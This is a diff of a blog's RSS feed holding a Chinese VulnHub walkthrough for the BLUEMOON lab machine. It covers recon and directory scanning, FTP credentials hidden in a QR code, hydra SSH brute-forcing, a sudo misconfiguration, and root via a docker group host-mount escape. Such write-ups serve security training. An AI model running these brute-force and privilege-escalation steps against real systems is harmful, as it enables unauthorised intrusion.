+&lt;h3 id=&#34;linux-识别二维码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-识别二维码&#34;&gt;#&lt;/a&gt; linux 识别二维码&lt;/h3&gt;
+&lt;p&gt;用 linux 来识别这个二维码，看能否从这个二维码中得到更多可靠的信息&lt;/p&gt;
+&lt;p&gt;下载到 kali 机器上，并修改文件名字为 qr.png:  &lt;code&gt;wget http://192.168.0.153/.QR_C0d3.png -O qr.png&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-713.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;Linux 下可以用 zbarimg 来识别二维码&lt;br&gt;
+ &lt;code&gt;zbarimg x.png&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-714.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 找到了 ftp 的账户和密码 ftp:ftpp@ssword&lt;/p&gt;
+&lt;h3 id=&#34;ftp-信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-信息收集&#34;&gt;#&lt;/a&gt; FTP 信息收集&lt;/h3&gt;
+&lt;p&gt;登陆到 ftp 服务器查看存在 ftp 中的有哪些文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-715.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 ftp 服务中的资料下载到本地查看内容&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-716.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; Infromation 中的内容如下，透露出来一个用户名 robin，并且他的密码强度弱 p_lists.txt 为一些密码，很显然需要通过 hydra 爆破&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-717.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 robin 作为用户名，p_lists 做为密码进行爆破 ssh，得到了密码&lt;br&gt;
+ &lt;code&gt;hydra -l robin -P p_lists.txt ssh://192.168.0.153 -f -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-718.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;通过 ssh 命令成功登陆到了靶机中&lt;br&gt;
+ &lt;code&gt;ssh 192.168.0.153 -l robin&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-719.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;docker-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-提权&#34;&gt;#&lt;/a&gt; docker 提权&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;  查看有无权限设置错误&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-720.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现可以以 jerry 的身份执行这个脚本  &lt;code&gt;sudo -u jerry /home/robin/project/feedback.sh&lt;/code&gt; &lt;br&gt;
+ 执行后，输入两个 bash，拿到了 jerry 的权限&lt;/p&gt;
+&lt;p&gt;用 python3 调整为一个比较美观的终端: &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-721.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;的时候发现属于docker组，尝试用docker提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整shell输出比较美观的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-722.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/130%20MOMENTUM2/</guid>
             <title>VULNHUB 30 MOMENTUM2</title>
             <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/130%20MOMENTUM2/</link>
@@ -1003,81 +1078,6 @@ john 破解 phpmyadmin 后台时可得到 admin:Stella, &lt;code&gt;su admin&lt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-784.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;Kali 上用来监听此端口，成功拿到了反弹的 shell&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-785.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/</guid>
-            <title>VULNHUB 28 BLUEMOON</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/</link>
-            <category>VULNHUB 21-30</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZW1vb24tMjAyMSw2Nzkv&#34;&gt;https://www.vulnhub.com/entry/bluemoon-2021,679/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZDViN2YyZDIwZTQ=&#34;&gt;https://www.jianshu.com/p/5d5b7f2d20e4&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 BLUEMOON：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
- &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-702.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
-&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-703.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
-&lt;h3 id=&#34;ftp-弱口令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-弱口令&#34;&gt;#&lt;/a&gt; FTP 弱口令&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-704.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看源代码，发现一个图片的地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-705.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;看样子是一个蓝色的月球，但是这个图片没什么作用&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-706.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;先尝试从 ftp 进行突破 &lt;code&gt;ftp 192.168.0.153&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-707.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;尝试弱口令登陆失败，接下来对 80 网站进行目录扫描&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;可以使用各种工具扫描，扫描结果可能因为字典的不同而得到不同的结果，这里我用 dirmap 和 gobuster 两者都扫描了一次&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;python3 dirmap.py -i http://192.168.0.153 -lcf&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.153&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-708.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;dirmap 默认的字典并不是很全，如果需要有更准确的信息，需要换字典&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-709.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 dirbuster 中的 directory 字典扫出来了一个目录：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvaGlkZGVuX3RleHQ=&#34;&gt;http://192.168.0.153/hidden_text&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-710.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看源代码，看能否有更多的发现，找到了一个隐藏的图片&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-711.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;访问得到了一个 url 地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvLlFSX0MwZDMucG5n&#34;&gt;http://192.168.0.153/.QR_C0d3.png&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-712.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;linux-识别二维码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-识别二维码&#34;&gt;#&lt;/a&gt; linux 识别二维码&lt;/h3&gt;
-&lt;p&gt;用 linux 来识别这个二维码，看能否从这个二维码中得到更多可靠的信息&lt;/p&gt;
-&lt;p&gt;下载到 kali 机器上，并修改文件名字为 qr.png:  &lt;code&gt;wget http://192.168.0.153/.QR_C0d3.png -O qr.png&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-713.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;Linux 下可以用 zbarimg 来识别二维码&lt;br&gt;
- &lt;code&gt;zbarimg x.png&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-714.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 找到了 ftp 的账户和密码 ftp:ftpp@ssword&lt;/p&gt;
-&lt;h3 id=&#34;ftp-信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-信息收集&#34;&gt;#&lt;/a&gt; FTP 信息收集&lt;/h3&gt;
-&lt;p&gt;登陆到 ftp 服务器查看存在 ftp 中的有哪些文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-715.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 ftp 服务中的资料下载到本地查看内容&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-716.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; Infromation 中的内容如下，透露出来一个用户名 robin，并且他的密码强度弱 p_lists.txt 为一些密码，很显然需要通过 hydra 爆破&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-717.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 robin 作为用户名，p_lists 做为密码进行爆破 ssh，得到了密码&lt;br&gt;
- &lt;code&gt;hydra -l robin -P p_lists.txt ssh://192.168.0.153 -f -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-718.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;通过 ssh 命令成功登陆到了靶机中&lt;br&gt;
- &lt;code&gt;ssh 192.168.0.153 -l robin&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-719.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;docker-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-提权&#34;&gt;#&lt;/a&gt; docker 提权&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;  查看有无权限设置错误&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-720.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现可以以 jerry 的身份执行这个脚本  &lt;code&gt;sudo -u jerry /home/robin/project/feedback.sh&lt;/code&gt; &lt;br&gt;
- 执行后，输入两个 bash，拿到了 jerry 的权限&lt;/p&gt;
-&lt;p&gt;用 python3 调整为一个比较美观的终端: &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-721.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;的时候发现属于docker组，尝试用docker提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整shell输出比较美观的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-722.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
  ]]></description>
         </item>
